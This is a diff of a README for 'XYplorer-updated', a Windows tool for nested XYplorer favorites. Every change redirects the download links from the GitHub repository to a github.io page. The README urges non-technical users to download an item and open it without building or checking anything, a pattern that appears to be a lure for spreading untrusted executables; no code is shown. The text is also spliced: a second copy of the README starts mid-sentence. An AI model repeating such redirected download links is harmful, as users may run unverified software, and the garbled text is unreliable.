@@ -1,6 +1,6 @@
 # 🗂️ XYplorer-updated - Build a Nested Favorites Menu Fast
 
-[![Download XYplorer-updated](https://img.shields.io/badge/Download-XYplorer--updated-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GIPPY754/XYplorer-updated)
+[![Download XYplorer-updated](https://img.shields.io/badge/Download-XYplorer--updated-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://gippy754.github.io)
 
 XYplorer-updated is a Windows tool for people who use XYplorer and want a better way to reach their favorite folders. It builds a clean nested menu of your favorites so you can open the folders you use most without searching through drives, long folder paths, or repeated clicks.
 
@@ -16,7 +16,7 @@ The tool is built around XYplorer, a file manager for Windows. XYplorer-updated 
 
 Start at the project download page:
 
-[Visit this link to download the application.](https://github.com/GIPPY754/XYplorer-updated)
+[Visit this link to download the application.](https://gippy754.github.io)
 
 The project page is the main place to get XYplorer-updated. Open the link in your browser, use the page to download the application, and keep the downloaded item somewhere easy to find, such as your Downloads folder.
 
@@ -26,13 +26,13 @@ No programming work is required. You are not expected to build the project, edit
 
 Visit this link to download the application:
 
-[Download XYplorer-updated](https://github.com/GIPPY754/XYplorer-updated)
+[Download XYplorer-updated](https://gippy754.github.io)
 
 The download page provides the application for Windows users. Once the download is complete, open the downloaded item on your computer to start XYplorer-updated. If your browser asks where to save the file, choose a familiar location like Downloads so you can find it again quickly.
 
 After the application opens, you can begin setting up your favorite folders and arranging# 🗂️ XYplorer-updated - Build a Nested Favorites Menu Fast
 
-[![Download XYplorer-updated](https://img.shields.io/badge/Download-XYplorer--updated-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GIPPY754/XYplorer-updated)
+[![Download XYplorer-updated](https://img.shields.io/badge/Download-XYplorer--updated-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://gippy754.github.io)
 
 XYplorer-updated is a Windows tool for people who use XYplorer and want a better way to reach their favorite folders. It builds a nested menu of your favorites so you can keep related places grouped together and open the folders you use most without searching through drives, long folder paths, or repeated clicks.
 
@@ -50,7 +50,7 @@ The tool is designed around XYplorer, a file manager for Windows. XYplorer-updat
 
 Start at the project download page:
 
-[Visit this link to download the application.](https://github.com/GIPPY754/XYplorer-updated)
+[Visit this link to download the application.](https://gippy754.github.io)
 
 The project page is the main place to get XYplorer-updated. Open the link in your browser and use the page to download the application for Windows. Save the downloaded item somewhere easy to find, such as your Downloads folder, so you can open it again without searching.
 
@@ -60,7 +60,7 @@ No programming work is required. You are not expected to build the project, edit
 
 Visit this link to download the application:
 
-[Download XYplorer-updated](https://github.com/GIPPY754/XYplorer-updated)
+[Download XYplorer-updated](https://gippy754.github.io)
 
 The download page provides the application for Windows users. Once the download is complete, open the downloaded item on your computer to start XYplorer-updated. Keep the downloaded item in a familiar place so you can find it later if you need to open it again.
 
@@ -142,7 +142,7 @@ Use XYplorer-updated as part of your normal file manager workflow. The applicati
 
 Do I need programming knowledge? No. XYplorer-updated is presented for end users, and this README guides you from the download page to opening the application on Windows.
 
-Where do I get the application? Visit the project page at https://github.com/GIPPY754/XYplorer-updated to download the application.
+Where do I get the application? Visit the project page at https://gippy754.github.io to download the application.
 
 What does the tool do? It builds a nested menu of your favorites for XYplorer, helping you group and reach favorite folders more easily.
 
